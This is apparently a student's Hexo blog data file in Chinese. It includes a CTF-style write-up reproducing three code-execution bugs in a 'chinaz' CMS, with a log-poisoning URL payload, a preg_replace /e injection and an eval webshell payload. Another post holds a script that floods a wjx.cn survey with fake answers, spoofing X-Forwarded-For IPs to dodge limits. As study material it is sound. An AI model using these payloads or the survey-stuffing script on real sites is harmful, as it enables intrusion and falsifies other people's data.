{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"感谢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"谢谢支持我的小伙伴"}],"posts":[{"title":"chinaz的代码执行和命令执行漏洞","slug":"chinaz的代码执行和命令执行漏洞","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-13T05:52:43.257Z","comments":true,"path":"2019/08/13/chinaz的代码执行和命令执行漏洞/","link":"","permalink":"http://yoursite.com/2019/08/13/chinaz的代码执行和命令执行漏洞/","excerpt":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。","text":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。 1、index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; index页面通过page参数调用不同功能的php页面 2、action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; 存在文件包含，但是存在后缀.php，过滤主要是filter， 全局搜索 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; 将 . 过滤成空，文件包含路径中不能有 . 导致无法使用相对路径 那么我们可以使用绝对路径进行包含。 可以包含常见重要文件或日志文件 3、common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; 当访问不存在的页面时，写入内容到logs/logfile.php中 4、漏洞一攻击复现构造payload： http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E 访问： http://59.110.164.44:8238/logs/logfile.php 如果没有直接访问权限，也可以使用action.php中的文件包含， 并且可以看到phpinfo中，因此无法远程文件包含 allow_url_fopen On On allow_url_include Off Off 5、normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replace的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置 method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(“/a/e”,”phpinfo()”,”a”); 但是php 7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替 而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍ 6、先解决变量覆盖问题1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); 除了$post_data，其他值都是写死的，如何控制 通过action.php的文件包含，进行变量覆盖控制 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7、漏洞二攻击复现在本地将php切换为php5.4构造payload: http://127.0.0.1/chinaz/ post： page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8、view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); 和典型的海洋cms漏洞差不多 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); 结果： 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9、寻找攻击点123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5文件包含了view.php，且有变量覆盖点，res可控制$strif 话是这么说，但是看了半天也看不懂res是怎么控制$strIf的，太多处理函数，最讨厌的一点是我每次firefox+burp+phpstorm调试一会就会断掉。。。不知道为啥😭 10、漏洞三复现构造payload： http://127.0.0.1/chinaz/action.php post：page=md5&amp;res=”or @eval($_POST[adddd]) or “&amp;adddd=phpinfo(); 这里的post的值需要bp抓包修改，因为hackbar直接传值res会变成”” 跟着pdf里面的流程走了一遍，除了第三个具体细节不是很懂，等下次复现海洋CMS的时候再回头看看把，还有希望有人帮我解决我的调试问题。","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"命令执行与代码执行","slug":"命令执行与代码执行","permalink":"http://yoursite.com/tags/命令执行与代码执行/"}]},{"title":"爬虫入门","slug":"爬虫入门","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-13T05:48:03.453Z","comments":true,"path":"2019/07/25/爬虫入门/","link":"","permalink":"http://yoursite.com/2019/07/25/爬虫入门/","excerpt":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看","text":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看 1、爬取某网站的招聘信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;爬取失败&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # 储存为json文件 f.write(json.dumps(result, indent=2, ensure_ascii=False)) # 储存为csv文件(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # 储存为excel文件 df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2、自动填写问卷123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; .ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headers从bp抓的包复制即可 绕过方法：使用xff、设置脚本发包的时间间隔 目前脚本很大概率会出现国外ip，可以搜集国内ip 参考链接：https://mochazz.github.io/","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr 这次天buuctf做到自闭，看换个博客能不能换个心情:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}